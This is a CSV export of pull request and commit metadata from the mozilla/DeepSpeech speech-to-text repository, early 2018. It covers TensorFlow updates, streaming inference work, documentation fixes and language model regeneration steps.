,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
3235,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1280,1280,Update tf master,,lissyx,1645737,2018-03-01T17:44:08Z,COLLABORATOR,True,178,122,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,164f67c972032d3f95272756cd0074f090dc96af,"Add Python2.7 ucs2+ucs4 variants

Fixes #1276"
3236,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1280,1280,Update tf master,,lissyx,1645737,2018-03-01T17:44:08Z,COLLABORATOR,True,178,122,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ebeb40292dd96c1fc129931b240f70009bca2de4,"Merge pull request #1279 from lissyx/py27-unicode

Add Python2.7 ucs2+ucs4 variants"
3237,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1280,1280,Update tf master,,lissyx,1645737,2018-03-01T17:44:08Z,COLLABORATOR,True,178,122,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4d343bb81ed13c1c1941965385251cc98386f7d,Merge remote-tracking branch 'upstream/master' into update-tf-master
3238,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1279,1279,Add Python2.7 ucs2+ucs4 variants,Fixes #1276,lissyx,1645737,2018-03-01T10:59:58Z,COLLABORATOR,True,178,122,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,164f67c972032d3f95272756cd0074f090dc96af,"Add Python2.7 ucs2+ucs4 variants

Fixes #1276"
3239,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1277,1277,fixed outdated README,,chuckcho,13352012,2018-02-28T23:44:21Z,NONE,False,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,adacafeb4756a93b1c7fd95a72dc2f66d7be9a95,fixed outdated README
3240,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,70cc9945c9b96d8604214dcd87a979dc729720ab,Streaming inference
3241,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f84c67cd8b4fecb0aad461b7f07b1eddd9c0856,Add tool to find out which ops are needed by a graph
3242,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9a15505434f08e9d7877eec38421c31e2213993,Update native_client/BUILD comment about binary sizes
3243,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17bdffe3410cc8d5b44cbab9139c0ddccf2c5f02,Add tool to convert graph protobuf to pbtxt
3244,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05ae19bf6e4c43f048647523f22ed991cb7d17e2,Add evaluate.py script to create a WER report from a checkpoint using the inference graph
3245,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f84ce5135d6255b8db7a2b82c5867020b0a58946,Increase CI training epochs to guarantee overfitting
3246,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92a0019e605ecdd76bf7c10688b53230e215ecb9,Convert native API to C instead of C++
3247,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c06ad6dc7cc8c95c37625cdf35e29debe3337642,Remove some deepspeech_utils references that crept up during rebase
3248,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19bb31b02776173af08f7ae46c3c5dbd306a27fd,Infer n_steps and n_context from model file
3249,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b1c858bbffac7bcf701d1ff3ed1586184bfde010,Switch to LSTMBlockFusedCell
3250,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2d1e275d92ddae83bba5e930b4f209c809c3df32,Don't handle dropout rates as Python values
3251,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,165e47ce997fac7b60673f243d0a1bbe36f57ccb,Add intermediateDecode method to the API
3252,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79a6c9e4fa63f94cdbbbf87d93e3c86b64e5997c,Finalize training graph before starting training
3253,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,949b6ae1c70e5abd699496b95e85a28aab04c499,Disable AOT tasks
3254,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e0b08ce80c02722feacec3d6e1c342534537ab9,Remove word count bonus in favor of length normalization
3255,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7e608f6ea1a07efbea1c83b8091c9643cab21d3,Architecture changes from training
3256,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c8523d94c51b575460c27c700b8f209cd226465,Switch to updated head in TensorFlow r1.6 branch
3257,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7b873365f8bfffe2ea84dcd34058b537e9095765,Switch prod model to a streaming based one
3258,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1270,1270,Fix positional arguments in README.md,The updated command has the positional arguments in the correct order to make inference work out of the box after getting the pre-trained model.,nilakshdas,1882688,2018-02-25T17:51:22Z,NONE,False,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a9857d091979dce1a4a7e1d36ff5a28b65d5967,"Fix positional arguments in README.md

The updated command has the positional arguments in the correct order to make inference work out of the box after getting the pre-trained model."
3259,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1264,1264,Update ccpp,,lissyx,1645737,2018-02-20T16:33:35Z,COLLABORATOR,True,28,27,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce80a094bac6e909a28a34b78a063ed311c470a0,"Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so

Fixes #1260
X-DeepSpeech: NOBUILD"
3260,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1264,1264,Update ccpp,,lissyx,1645737,2018-02-20T16:33:35Z,COLLABORATOR,True,28,27,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93393ddca3775f3f03a5c2d637e1824ac37cfec9,"Merge pull request #1261 from lissyx/doc-decoder

Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so
X-DeepSpeech: NOBUILD"
3261,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1264,1264,Update ccpp,,lissyx,1645737,2018-02-20T16:33:35Z,COLLABORATOR,True,28,27,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc3b28291d433fd65f0db1635e290bef3f02e77d,Merge remote-tracking branch 'upstream/master' into update-ccpp
3262,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1264,1264,Update ccpp,,lissyx,1645737,2018-02-20T16:33:35Z,COLLABORATOR,True,28,27,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04ebefa1ad36fd8717175a2fea7d403d0ecab527,Update TF CCPP
3263,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1263,1263,Update tf master,,lissyx,1645737,2018-02-20T16:33:21Z,COLLABORATOR,True,26,25,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce80a094bac6e909a28a34b78a063ed311c470a0,"Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so

Fixes #1260
X-DeepSpeech: NOBUILD"
3264,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1263,1263,Update tf master,,lissyx,1645737,2018-02-20T16:33:21Z,COLLABORATOR,True,26,25,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93393ddca3775f3f03a5c2d637e1824ac37cfec9,"Merge pull request #1261 from lissyx/doc-decoder

Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so
X-DeepSpeech: NOBUILD"
3265,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1263,1263,Update tf master,,lissyx,1645737,2018-02-20T16:33:21Z,COLLABORATOR,True,26,25,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f2306bef1806fa1df3475a7b2aa53e77767dea3,Merge remote-tracking branch 'upstream/master' into update-tf-master
3266,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1263,1263,Update tf master,,lissyx,1645737,2018-02-20T16:33:21Z,COLLABORATOR,True,26,25,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c07e3470ba8eaff61ea0f4ec0b5a9a772e57b2a2,Update TF
3267,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1261,1261,Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so,"Fixes #1260
X-DeepSpeech: NOBUILD",lissyx,1645737,2018-02-20T10:16:20Z,COLLABORATOR,True,5,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce80a094bac6e909a28a34b78a063ed311c470a0,"Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so

Fixes #1260
X-DeepSpeech: NOBUILD"
3268,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1256,1256,Ccpp new,,lissyx,1645737,2018-02-16T18:20:58Z,COLLABORATOR,True,95,28,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c30a6d7ee5bec67a406647d46552ae5d26c23c1,WIP: Linux/AMD64/OpenCL+CCPP builds
3269,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1255,1255,Sync master,,lissyx,1645737,2018-02-16T10:20:04Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,52adc2b2ddfb70eebfea84ada44f74af29336f2b,Force re-build
3270,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1255,1255,Sync master,,lissyx,1645737,2018-02-16T10:20:04Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1342dc8fb7a43911e1a6bce52b38e8ef800acce2,Merge remote-tracking branch 'upstream/master' into sync-master
3271,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1255,1255,Sync master,,lissyx,1645737,2018-02-16T10:20:04Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f0372af50c2882c0fafdb9d4b94ff794e45368b4,Use proper convert_graphdef tool from master
3272,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1255,1255,Sync master,,lissyx,1645737,2018-02-16T10:20:04Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ee1e9eea707fd2db65930f4093dec9fe8f90760,Update deps to 1.6.0-rc1
3273,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1255,1255,Sync master,,lissyx,1645737,2018-02-16T10:20:04Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7de465b2b7f4f0e2e21efa332954f20086aeed1e,Switch to new TensorFlow master
3274,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cee1ec0f17964d6a1138c2bbcfe7a075a34ca220,Remove deprecated session_bundle usage and clean up export code
3275,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,983e13f218803bd1c37536073c41c3a435616525,Remove TF 1.0 compatibility hack
3276,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32c06acdf86baf31a92621c602ea9a8fd0d4a0b5,"Merge pull request #1229 from mozilla/export-cleanup

Clean up export code and remove some TF 1.0 compat code (Fixes #1228)"
3277,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f54b1f6ad83690b3b321bb6b45a41d0cbf6cbe66,"Multiple audio native_client benchmark

Fixes #1232"
3278,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd8d463dc171efaea4bfce6e70584dabe94e2a5c,"Merge pull request #1234 from lissyx/nc-multi

Multiple audio native_client benchmark"
3279,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c323e8c6726bcd0b7e97474e2dacd30bcf1b78e,"Support MemmappedFileSystem

Fixes #1231"
3280,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23c8dcffcf9337c394301d2756976b234729cc9b,"Merge pull request #1235 from lissyx/memmapped

Support MemmappedFileSystem"
3281,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48fbf864122a23b772f37ffcbdec6fbfa4374289,Merge remote-tracking branch 'upstream/master' into update-tf-master
3282,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d7653d749b68a8a487e161f87cbc8c2f0c23eedd,"Use LDC93S1 small language model

How to regenerate:
 - Get a KenLM build
 - $ (tr -d '[:digit:]|[:punct:]' < LDC93S1.txt | tr '[:upper:]' '[:lower:]'; head -n 500 ../lm/vocab.txt) > vocab.txt
 - $ bin/lmplz --prune 0 0 1 --order 5 --text vocab.txt --arpa vocab.pruned.arpa
 - $ bin/build_binary  -s vocab.pruned.arpa vocab.pruned.lm
 - $ generate_trie ../alphabet.txt vocab.pruned.lm vocab.txt vocab.trie

Fixes #1245"
3283,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d58ad709a7761c3afdc61ffe942a1f43fb567a18,"Merge pull request #1247 from lissyx/remove-gitlfs

Use LDC93S1 small language model"
3284,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e4773028ba915ec9481a9ec6a3b3b978c8a1c074,"Update doc for mmap-able model

Fixes #1248"
3285,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,24e6b0f584306d051c1a619146dc1da2d5507403,Merge remote-tracking branch 'upstream/master' into update-tf-master
3286,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7404cdde280aa57955651d5086e79de821b8f3fe,"Merge pull request #1249 from lissyx/doc-mmap

Update doc for mmap-able model"
3287,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,62034f7bf6b58f8028fc468b9d9cc4a15efee0e3,"Switch to use Amazon EC2 mirrors

Fixes #1250"
3288,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60ef348587a3f3c4b28cf8f23685ed5dd77e5090,Merge remote-tracking branch 'upstream/master' into update-tf-master
